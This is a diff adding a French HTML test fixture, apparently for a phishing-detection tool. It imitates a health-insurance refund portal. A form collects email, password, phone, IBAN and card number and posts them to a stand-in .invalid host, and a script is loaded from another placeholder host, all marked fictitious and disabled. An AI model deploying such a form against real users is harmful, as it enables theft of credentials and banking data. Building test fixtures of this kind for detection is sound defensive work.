@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <title>FAUSSE PAGE DE TEST — assurance maladie</title>
+  <meta name="robots" content="noindex,nofollow">
+</head>
+<body>
+  <!--
+    FIXTURE DE TEST PASTATSHIELD — NE PAS PUBLIER COMME PAGE WEB.
+    Aucun logo officiel, aucune URL réelle de destination et aucun script exécuté.
+    Cette page n'est affiliée ni à Ameli ni à l'Assurance Maladie.
+  -->
+  <main>
+    <h1>EXEMPLE FICTIF : faux portail de remboursement</h1>
+    <p>Ce fichier simule une tentative d'hameçonnage pour des tests automatisés hors ligne.</p>
+    <form action="http://collecte-assurance.example.invalid/recevoir" method="post">
+      <label for="email">Adresse e-mail</label>
+      <input id="email" name="email" type="email" autocomplete="email">
+      <label for="password">Mot de passe</label>
+      <input id="password" name="mot_de_passe" type="password" autocomplete="current-password">
+      <label for="telephone">Téléphone</label>
+      <input id="telephone" name="telephone" type="tel" autocomplete="tel">
+      <label for="iban">IBAN</label>
+      <input id="iban" name="iban" type="text" autocomplete="off">
+      <label for="card">Carte bancaire</label>
+      <input id="card" name="card_number" type="text" autocomplete="cc-number">
+      <button type="submit" disabled>Ne pas envoyer — simulation</button>
+    </form>
+    <!-- L'URL ci-dessous est fictive et n'est jamais téléchargée par le parser. -->
+    <script type="application/json" id="fixture-metadata">{"test_only":true}</script>
+    <script src="https://script-miroir.example.invalid/pixel.js" defer></script>
+  </main>
+</body>
+</html>
